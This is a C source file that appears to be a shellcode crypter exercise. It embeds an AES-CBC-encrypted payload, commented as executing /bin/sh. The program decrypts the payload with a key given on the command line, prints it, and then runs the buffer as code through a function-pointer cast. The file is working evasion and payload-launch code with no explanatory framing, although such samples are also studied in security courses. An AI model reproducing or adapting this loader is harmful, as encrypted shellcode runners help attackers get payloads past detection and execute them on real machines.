#include <stdio.h>
#include <string.h>
#include <stdint.h>

// Enabling CBC must be done before including aes.h or at compile-time.
// For compile time, use -DCBC=1
#define CBC 1

#include "aes.h"

// encrypted execve /bin/sh
uint8_t shellcode[] = "\x2F\x98\x36\x4B\xA8\xD1\x48\x01\x44\xBB\x3D\xCC\x15\xBB\x29\x08\x09\x63\x79\x69\xB7\x0B\xEA\x9D\x7A\xEB\xE9\xE6\x01\x96\x7A\x56\xB8\x94\xD7\x08\x67\x49\x1D\x31\x6E\xB4\x61\x08\x31\xB8\xC5\x40";

void printHex(uint8_t* buffer, size_t size) {
    for (int i = 0; i < size; i++) {
        printf("\\x%02X", buffer[i]);
    }
    printf("\n");
}


void decrypt(char* givenKey, size_t size) {
    uint8_t key[32] = { 0 };
    uint8_t iv[]  = { 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f };
    struct AES_ctx ctx;

    printf("\nDecrypting shellcode...");

    memcpy(key, givenKey, strlen(givenKey));
    AES_init_ctx_iv(&ctx, key, iv);
    AES_CBC_decrypt_buffer(&ctx, shellcode, size);

    printf("Done!\n");
}


int main(int argc, char* argv[])
{
    size_t encryptedSize = sizeof(shellcode) - 1; // disregard null terminator
    printf("Encrypted Shellcode:\n");
    printHex(shellcode, encryptedSize);

    decrypt(argv[1], encryptedSize);
    printf("\nDecrypted Shellcode:\n");
    printHex(shellcode, encryptedSize);

    printf("\nLaunching shellcode...\n");
    int (*ret)() = (int(*)())shellcode;
    ret();

    return 0;
}
